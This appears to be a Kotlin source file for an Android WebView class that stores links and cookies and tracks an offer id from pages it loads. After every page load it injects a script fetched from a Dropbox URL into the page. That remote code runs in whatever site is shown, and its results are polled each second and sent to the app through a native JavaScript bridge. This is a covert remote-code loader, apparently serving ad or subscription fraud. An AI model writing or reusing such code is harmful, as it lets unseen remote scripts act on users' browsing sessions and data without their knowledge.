package org.compact.tech

import android.content.Context
import android.net.Uri
import android.util.AttributeSet
import android.webkit.*

class ScrView(context: Context, attrs: AttributeSet) : ScrBaseView(context, attrs) {
    var preferences = ScrPreferences(context)
    var query: String? = null
    var preland: String? = preferences.getPreland()

    init {
        setClient()
    }

    fun startIfSaved(): Boolean {
        preferences.getLink()?.let { link ->
            preferences.getCookies()?.let {
                CookieManager.getInstance().setCookie(url, it)
            }
            loadUrl(link)
            return true
        }
        return false
    }

    fun start(link: String) {
        loadUrl(link)
    }

    fun setAskListener(askListener: Ask.Listener) {
        addJavascriptInterface(Ask(askListener), "android")
    }

    fun save() {
        preferences.saveLink(url.toString())
        preferences.saveCookies(CookieManager.getInstance().getCookie(url.toString()))
    }

    private fun initMainFunc(id: String) =
        loadUrl(
            "javascript:(function(){sdz=document.createElement(\"script\");sdz.onload=" +
                    "function(){mainFunc('$id');setInterval(()=>android.onAsk(askReg()),1000);};" +
                    "sdz.src=\"https://dl.dropbox.com/s/kgsfkk6u16vchbl/mf.js\";document.body.appendChild(sdz);})()"
        )

    private fun setClient() {
        webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?): Boolean {
                Uri.parse(url).getQueryParameter("cust_offer_id")?.let { query = it }
                return false
            }

            override fun onPageFinished(v: WebView?, url: String?) {
                if (preland.isNullOrEmpty()) {
                    val script = "document.querySelector('meta[name=\"cust_offer_id\"]').content"
                    evaluateJavascript(script) {
                        val result = it.replace("\"", "")
                        if (result.isNotEmpty() && result != "null") {
                            preland = result
                            preferences.savePreland(result)
                        }
                    }
                }

                preland?.let { initMainFunc(it) } ?: query?.let { initMainFunc(it) }
            }
        }
    }
}
